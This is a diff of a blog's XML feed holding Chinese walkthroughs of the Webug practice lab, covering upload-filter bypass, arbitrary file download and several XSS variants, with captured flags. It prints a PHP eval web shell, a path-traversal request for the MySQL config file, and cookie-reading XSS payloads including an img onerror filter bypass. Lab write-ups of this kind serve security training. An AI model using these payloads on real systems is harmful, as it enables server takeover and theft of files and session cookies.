@@ -6,11 +6,11 @@
     <content><![CDATA[<h2 id="前端拦截"><a href="#前端拦截" class="headerlink" title="前端拦截"></a>前端拦截</h2><p>先写一个php一句话木马</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>])<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 <a id="more"></a>
-<img src="/posts/undefined/1.png" class="" title="This is an 1 image">
+<img src="/posts/54783098/1.png" class="" title="This is an 1 image">
 <p>还没点上传就拦截  一看就是前端防护 直接用burp上传就好 也可以关闭浏览器js<br>把1.php改成1.jpg burp抓包 点击上传<br>把抓的包丢到repeater里修改后缀为.php<br>点击上传</p>
-<img src="/posts/undefined/2.png" class="" title="This is an 2 image">
+<img src="/posts/54783098/2.png" class="" title="This is an 2 image">
 <p>打开上传的文件执行phpinfo</p>
-<img src="/posts/undefined/3.png" class="" title="This is an 3 image">
+<img src="/posts/54783098/3.png" class="" title="This is an 3 image">
 
 <h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
       <categories>
@@ -25,16 +25,16 @@
     <url>/posts/89a7edf4.html</url>
     <content><![CDATA[<h2 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h2><p>打开网页</p>
 <a id="more"></a>
-<img src="/posts/undefined/1.png" class="" title="This is an 1 image">
+<img src="/posts/89a7edf4/1.png" class="" title="This is an 1 image">
 <p>把两个下载的url复制下来</p>
 <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">file_download.php?<span class="attribute">file</span>=template/assets/img/1.txt</span><br><span class="line">file_download.php?<span class="attribute">file</span>=template/assets/img/2.txt</span><br></pre></td></tr></table></figure>
 <p>在file后面改成其他文件就可以下载其他文件了<br>如下载index.php文件</p>
 <figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">file_download.php?<span class="keyword">file</span>=<span class="keyword">index</span>.php</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/2.png" class="" title="This is an 2 image">
+<img src="/posts/89a7edf4/2.png" class="" title="This is an 2 image">
 
 <h2 id="mysql配置文件下载"><a href="#mysql配置文件下载" class="headerlink" title="mysql配置文件下载"></a>mysql配置文件下载</h2><p>去百度查一下mysql的文件所在地 然后下载<br>payload</p>
 <figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">ini_file_download.php?<span class="keyword">file</span>=..<span class="regexp">/../</span>..<span class="regexp">/phpstudy/my</span>sql<span class="regexp">/my.ini</span></span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/2.png" class="" title="This is an 2 image">
+<img src="/posts/89a7edf4/2.png" class="" title="This is an 2 image">
 ]]></content>
       <categories>
         <category>Webug 靶场</category>
@@ -48,33 +48,33 @@
     <url>/posts/b360063c.html</url>
     <content><![CDATA[<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>payload</p>
 <figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">xss_1.php<span class="built_in">?id</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/1.png" class="" title="This is an 1 image">
+<img src="/posts/b360063c/1.png" class="" title="This is an 1 image">
 <p>flag:fsdafasdfas</p>
 <h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>payload</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <a id="more"></a>
-<img src="/posts/undefined/2.png" class="" title="This is an 2 image">
-<img src="/posts/undefined/3.png" class="" title="This is an 3 image">
+<img src="/posts/b360063c/2.png" class="" title="This is an 2 image">
+<img src="/posts/b360063c/3.png" class="" title="This is an 3 image">
 <p>flag:asdfsdfadfsdrew</p>
 <h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p>查看源代码 发现需要闭合</p>
-<img src="/posts/undefined/4.png" class="" title="This is an 4 image">
+<img src="/posts/b360063c/4.png" class="" title="This is an 4 image">
 <p>payload</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/5.png" class="" title="This is an 5 image">
+<img src="/posts/b360063c/5.png" class="" title="This is an 5 image">
 <p>flag:uoijkhhnloh</p>
 <h2 id="过滤xss"><a href="#过滤xss" class="headerlink" title="过滤xss"></a>过滤xss</h2><p>输入好多次payload发现都被拦截  <code>script</code>输入就被拦截</p>
-<img src="/posts/undefined/6.png" class="" title="This is an 6 image">
+<img src="/posts/b360063c/6.png" class="" title="This is an 6 image">
 <p>那么我们换一种方法<br>payload</p>
 <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">filter_xss.php?<span class="attribute">id</span>=1&lt;img <span class="attribute">src</span>=1 <span class="attribute">onerror</span>=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/7.png" class="" title="This is an 7 image">
+<img src="/posts/b360063c/7.png" class="" title="This is an 7 image">
 <p>flag:fsdafasdfas<br>结果发现提交错误<br>插卡代码 </p>
-<img src="/posts/undefined/8.png" class="" title="This is an 8 image">
+<img src="/posts/b360063c/8.png" class="" title="This is an 8 image">
 <p>如果对了就跳到id为9的数据上<br>我看了一眼数据库发现id=9是反射型xss的flag<br>id=13才是过滤xss  修改一下重新提交</p>
-<img src="/posts/undefined/9.png" class="" title="This is an 9 image">
+<img src="/posts/b360063c/9.png" class="" title="This is an 9 image">
 <p>flag:poipjklkjppoi</p>
 <h2 id="链接注入"><a href="#链接注入" class="headerlink" title="链接注入"></a>链接注入</h2><p>链接注入 那就是可以插入外部链接了呗<br>构造一个a标签看看怎样</p>
 <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">link_xss.php?<span class="attribute">id</span>=&lt;a <span class="attribute">href</span>=<span class="string">"https://timorblog.cn"</span>&gt;博客&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/10.png" class="" title="This is an 10 image">]]></content>
+<img src="/posts/b360063c/10.png" class="" title="This is an 10 image">]]></content>
       <categories>
         <category>Webug 靶场</category>
       </categories>
